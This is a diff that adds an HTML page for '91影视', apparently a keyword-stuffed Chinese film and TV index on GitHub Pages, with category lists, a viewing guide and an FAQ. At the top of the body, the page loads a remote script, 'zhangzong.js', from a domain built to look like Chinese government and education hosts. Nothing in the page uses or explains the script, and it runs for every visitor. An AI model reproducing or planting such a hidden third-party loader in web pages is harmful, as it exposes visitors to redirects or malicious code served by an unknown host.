@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>91影视｜91yingshi-zh.github.io 影视在线观看与资源导航</title>
+<meta name="description" content="91影视（91yingshi-zh.github.io）提供电影、电视剧、动漫、综艺与纪录片的分区索引和观看指引，包含内容分类、更新说明、访问方式与常见问题。本站为静态导航页，所有条目均为索引信息，实际播放以各平台为准。">
+<meta name="keywords" content="91影视,91yingshi-zh.github.io,91yingshi-zh,影视在线观看,电影电视剧动漫综艺索引">
+<meta name="author" content="91影视">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://91yingshi-zh.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="91影视｜91yingshi-zh.github.io 影视在线观看与资源导航">
+<meta property="og:description" content="91影视（91yingshi-zh.github.io）提供电影、电视剧、动漫、综艺与纪录片的分区索引和观看指引。">
+<meta property="og:url" content="https://91yingshi-zh.github.io/">
+<meta name="twitter:card" content="summary">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#14171c;--panel:#1c2129;--line:#2b323d;--txt:#e8eaee;--dim:#9aa3b2;--acc:#ff7a45;--acc2:#ffb020}
+body{background:var(--bg);color:var(--txt);font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;line-height:1.75;-webkit-text-size-adjust:100%}
+.wrap{max-width:1080px;margin:0 auto;padding:0 18px}
+/* 顶栏 */
+.top{background:var(--panel);border-bottom:3px solid var(--acc);padding:14px 0;position:sticky;top:0;z-index:50}
+.top .in{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.logo{font-size:20px;font-weight:800;letter-spacing:1px}
+.logo b{color:var(--acc)}
+.url{margin-left:auto;font-size:12px;color:var(--dim);border:1px solid var(--line);padding:5px 10px;border-radius:20px}
+/* 首屏 */
+.hero{padding:58px 0 40px;text-align:center;background:radial-gradient(1200px 300px at 50% -80px,#2a2018 0%,transparent 60%)}
+.hero h1{font-size:clamp(30px,6vw,52px);line-height:1.25;font-weight:800}
+.hero h1 em{font-style:normal;color:var(--acc);display:block;font-size:.55em;margin-top:10px;letter-spacing:2px}
+.hero p{color:var(--dim);max-width:660px;margin:16px auto 0;font-size:15px}
+/* 导航 */
+nav{background:var(--panel);border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:10px 0;margin-bottom:36px;overflow-x:auto}
+nav .in{display:flex;gap:6px;flex-wrap:nowrap;min-width:max-content}
+nav a{color:var(--dim);text-decoration:none;font-size:13.5px;padding:7px 13px;border:1px solid var(--line);border-radius:6px;white-space:nowrap}
+nav a:hover{color:#fff;border-color:var(--acc)}
+/* 区块 */
+section{padding:26px 0;border-bottom:1px dashed var(--line)}
+.sec-h{display:flex;align-items:baseline;gap:12px;margin-bottom:20px}
+.sec-h span{background:var(--acc);color:#14171c;font-weight:800;font-size:13px;padding:3px 9px;border-radius:4px}
+.sec-h h2{font-size:22px}
+.sec-h small{color:var(--dim);font-size:12.5px;margin-left:auto}
+/* 分类卡 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:18px;transition:.2s}
+.card:hover{border-color:var(--acc);transform:translateY(-3px)}
+.card h3{font-size:16px;margin-bottom:8px;display:flex;justify-content:space-between}
+.card h3 i{font-style:normal;color:var(--acc2);font-size:12px;font-weight:600}
+.card p{font-size:13px;color:var(--dim)}
+/* 列表 */
+ul.plain{list-style:none;display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:9px 22px}
+ul.plain li{font-size:14px;padding-left:16px;position:relative;color:#d5d9e0}
+ul.plain li::before{content:"";position:absolute;left:0;top:11px;width:6px;height:6px;background:var(--acc);border-radius:50%}
+ul.plain li b{color:#fff;font-weight:600}
+/* 表格 */
+table{width:100%;border-collapse:collapse;font-size:13.5px;background:var(--panel)}
+th,td{border:1px solid var(--line);padding:10px 12px;text-align:left;vertical-align:top}
+th{background:#232a34;color:var(--acc2);font-weight:600;white-space:nowrap}
+td a{color:var(--acc);text-decoration:none;word-break:break-all}
+.tbl-box{overflow-x:auto}
+/* 步骤 */
+.steps{counter-reset:s}
+.step{position:relative;padding:0 0 20px 40px}
+.step:last-child{padding-bottom:0}
+.step::before{counter-increment:s;content:counter(s);position:absolute;left:0;top:2px;width:26px;height:26px;background:var(--acc);color:#14171c;font-weight:800;font-size:13px;border-radius:50%;display:grid;place-items:center}
+.step h4{font-size:15px;margin-bottom:4px}
+.step p{font-size:13.5px;color:var(--dim)}
+/* FAQ */
+details{background:var(--panel);border:1px solid var(--line);border-radius:6px;margin-bottom:9px;padding:12px 16px}
+summary{cursor:pointer;font-size:14.5px;font-weight:600;list-style:none}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"＋";float:right;color:var(--acc)}
+details[open] summary::after{content:"－"}
+details p{font-size:13.5px;color:var(--dim);margin-top:10px}
+/* 页脚 */
+footer{margin-top:40px;padding:28px 0 40px;background:var(--panel);border-top:3px solid var(--acc)}
+.foot-cols{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;margin-bottom:22px}
+.foot-cols h5{font-size:14px;margin-bottom:9px;color:var(--acc2)}
+.foot-cols p,.foot-cols a{font-size:12.5px;color:var(--dim);text-decoration:none;display:block;margin-bottom:5px;word-break:break-all}
+.copy{font-size:12px;color:var(--dim);text-align:center;border-top:1px solid var(--line);padding-top:16px}
+.top-link{position:fixed;right:16px;bottom:20px;background:var(--acc);color:#14171c;width:42px;height:42px;border-radius:50%;display:grid;place-items:center;text-decoration:none;font-size:18px;box-shadow:0 4px 14px rgba(0,0,0,.5)}
+@media (max-width:760px){
+ .url{margin-left:0;width:100%}
+ .foot-cols{grid-template-columns:1fr}
+ .sec-h{flex-wrap:wrap}
+ .sec-h small{margin-left:0;width:100%}
+ .hero{padding:38px 0 28px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="top">
+  <div class="wrap in">
+    <div class="logo"><b>91</b>影视</div>
+    <div class="url">https://91yingshi-zh.github.io</div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="wrap">
+    <h1>91影视<em>91yingshi-zh.github.io</em></h1>
+    <p>91影视（91yingshi-zh.github.io）是按类型划分的影视索引与观看指引页面，涵盖电影、电视剧、动漫、综艺和纪录片，提供内容说明、访问方式与常见问题解答。</p>
+  </div>
+</div>
+
+<nav>
+  <div class="wrap in">
+    <a href="#film">电影</a>
+    <a href="#tv">电视剧</a>
+    <a href="#cartoon">动漫</a>
+    <a href="#show">综艺与纪录片</a>
+    <a href="#guide">观看指南</a>
+    <a href="#data">内容构成</a>
+    <a href="#faq">常见问题</a>
+    <a href="#about">关于本站</a>
+    <a href="#">返回顶部</a>
+  </div>
+</nav>
+
+<main class="wrap">
+
+  <section id="film">
+    <div class="sec-h"><span>01</span><h2>电影</h2><small>按题材与地区划分</small></div>
+    <div class="grid">
+      <div class="card"><h3>剧情片 <i>索引</i></h3><p>以人物与故事为核心的影片，包含国产、欧美、日韩及华语地区的分类条目。</p></div>
+      <div class="card"><h3>动作与犯罪 <i>索引</i></h3><p>强调节奏与场面的类型片，提供年份、地区与系列的检索说明。</p></div>
+      <div class="card"><h3>喜剧与爱情 <i>索引</i></h3><p>偏轻松叙事的作品，按题材和语言做二次归类，便于按心情筛选。</p></div>
+      <div class="card"><h3>科幻与奇幻 <i>索引</i></h3><p>设定驱动型影片，标注世界观、系列关联与观看顺序建议。</p></div>
+      <div class="card"><h3>悬疑与惊悚 <i>索引</i></h3><p>注重反转与氛围的作品，附剧透提示与分级参考。</p></div>
+      <div class="card"><h3>动画与纪录电影 <i>索引</i></h3><p>动画长片与纪录电影单列，区分合家欢与成人向内容。</p></div>
+    </div>
+  </section>
+
+  <section id="tv">
+    <div class="sec-h"><span>02</span><h2>电视剧</h2><small>按集数与地区归类</small></div>
+    <ul class="plain">
+      <li><b>国产剧</b>：都市、古装、年代、悬疑等题材的分季索引</li>
+      <li><b>美剧</b>：按季更新，标注单集时长与完结状态</li>
+      <li><b>日韩剧</b>：按播出季度与题材做横向对比说明</li>
+      <li><b>英剧与欧剧</b>：短季精品，标注集数与续订情况</li>
+      <li><b>泰剧与东南亚剧</b>：按题材与字幕版本分类</li>
+      <li><b>短剧与微剧</b>：单集时长较短的系列内容索引</li>
+    </ul>
+  </section>
+
+  <section id="cartoon">
+    <div class="sec-h"><span>03</span><h2>动漫</h2><small>新番、经典与剧场版</small></div>
+    <div class="grid">
+      <div class="card"><h3>日本动画 <i>索引</i></h3><p>按播出季与制作公司归类，标注连载状态与话数。</p></div>
+      <div class="card"><h3>国产动画 <i>索引</i></h3><p>网络动画与电视动画分列，附适合年龄段提示。</p></div>
+      <div class="card"><h3>欧美动画 <i>索引</i></h3><p>成人向与合家欢分开，标注季数与单集时长。</p></div>
+      <div class="card"><h3>剧场版与 OVA <i>索引</i></h3><p>梳理上映顺序与 TV 版的前后关系，避免观看错位。</p></div>
+    </div>
+  </section>
+
+  <section id="show">
+    <div class="sec-h"><span>04</span><h2>综艺与纪录片</h2><small>更新周期与主题分类</small></div>
+    <ul class="plain">
+      <li><b>真人秀</b>：生活、竞技、旅行类节目按季索引</li>
+      <li><b>谈话与脱口秀</b>：单期独立，适合按嘉宾检索</li>
+      <li><b>音乐与选秀</b>：标注期数与舞台剪辑版本</li>
+      <li><b>美食与旅行</b>：按拍摄地区与主持人归类</li>
+      <li><b>自然与科学</b>：纪录片的主题与集数说明</li>
+      <li><b>历史与人文</b>：按年代与地域做纵向梳理</li>
+    </ul>
+  </section>
+
+  <section id="guide">
+    <div class="sec-h"><span>05</span><h2>观看指南</h2><small>四步完成访问</small></div>
+    <div class="step"><h4>确认访问入口</h4><p>本站固定网址为 https://91yingshi-zh.github.io，建议收藏该地址，避免通过不明跳转链接进入。</p></div>
+    <div class="step"><h4>选择内容分区</h4><p>在导航栏点选电影、电视剧、动漫或综艺纪录片，进入对应索引区按题材筛选。</p></div>
+    <div class="step"><h4>核对信息再观看</h4><p>条目页会标注年份、地区、集数与状态，确认版本与清晰度后再选择播放渠道。</p></div>
+    <div class="step"><h4>遇到问题先看 FAQ</h4><p>加载、兼容性与更新相关的问题先查下方常见问题，仍有疑问可通过站内说明反馈。</p></div>
+  </section>
+
+  <section id="data">
+    <div class="sec-h"><span>06</span><h2>内容构成</h2><small>分区与更新说明</small></div>
+    <div class="tbl-box">
+      <table>
+        <thead><tr><th>分区</th><th>条目形式</th><th>更新方式</th><th>访问入口</th></tr></thead>
+        <tbody>
+          <tr><td>电影</td><td>按题材与地区分组的索引条目</td><td>随片单调整补充</td><td><a href="#film">#film</a></td></tr>
+          <tr><td>电视剧</td><td>按季与集数整理的观看指引</td><td>按播出进度更新</td><td><a href="#tv">#tv</a></td></tr>
+          <tr><td>动漫</td><td>新番、经典与剧场版分类</td><td>按播出季更新</td><td><a href="#cartoon">#cartoon</a></td></tr>
+          <tr><td>综艺与纪录片</td><td>按主题与更新周期归类</td><td>按节目周期更新</td><td><a href="#show">#show</a></td></tr>
+          <tr><td>观看指南</td><td>访问与筛选的操作步骤</td><td>按需修订</td><td><a href="#guide">#guide</a></td></tr>
+          <tr><td>常见问题</td><td>加载、兼容性与版权相关问答</td><td>问题集中后补充</td><td><a href="#faq">#faq</a></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="sec-h"><span>07</span><h2>常见问题</h2><small>FAQ</small></div>
+    <details open><summary>91影视的网址是什么？</summary><p>固定网址为 https://91yingshi-zh.github.io，域名是 91yingshi-zh.github.io，建议直接输入或收藏，不要通过第三方短链访问。</p></details>
+    <details><summary>页面打不开或加载缓慢怎么办？</summary><p>先确认网络与浏览器版本，再尝试刷新或清除缓存；仍无法访问时可能是网络环境限制，可稍后重试。</p></details>
+    <details><summary>内容多久更新一次？</summary><p>索引按片单与播出进度调整，无固定的日更或周更承诺，具体以页面实际显示为准。</p></details>
+    <details><summary>是否提供下载？</summary><p>本站为静态索引与指引页面，不提供下载服务，也不存储任何音视频文件，请通过正规授权平台观看。</p></details>
+    <details><summary>为什么有些条目只有文字说明？</summary><p>条目用于信息索引与检索，实际播放需跳转至相应平台，本站不承担播放源可用性的责任。</p></details>
+  </section>
+
+  <section id="about">
+    <div class="sec-h"><span>08</span><h2>关于本站</h2><small>91影视 简介</small></div>
+    <p style="font-size:14px;color:#d5d9e0">91影视（域名 91yingshi-zh.github.io，网址 https://91yingshi-zh.github.io）是一个以影视分类索引和观看指引为主的静态页面，目的是帮助用户按类型、地区与更新状态快速定位内容。本站不存储、不上传任何音视频资源，所有内容信息仅供检索参考，实际观看请选择具有合法授权的平台。</p>
+  </section>
+
+</main>
+
+<a class="top-link" href="#" title="返回顶部">↑</a>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-cols">
+      <div>
+        <h5>网站名称</h5>
+        <p>91影视</p>
+        <p>内容定位：影视分类索引与观看指引</p>
+      </div>
+      <div>
+        <h5>网站网址</h5>
+        <a href="https://91yingshi-zh.github.io">https://91yingshi-zh.github.io</a>
+        <a href="#">https://91yingshi-zh.github.io</a>
+        <p>域名：91yingshi-zh.github.io</p>
+      </div>
+      <div>
+        <h5>快捷分区</h5>
+        <a href="#film">电影</a>
+        <a href="#tv">电视剧</a>
+        <a href="#cartoon">动漫</a>
+        <a href="#show">综艺与纪录片</a>
+      </div>
+    </div>
+    <div class="copy">© 91影视 ｜ 网站网址：https://91yingshi-zh.github.io ｜ 域名：91yingshi-zh.github.io ｜ 本页为静态索引页，仅供信息检索参考</div>
+  </div>
+</footer>
+
+</body>
+</html>
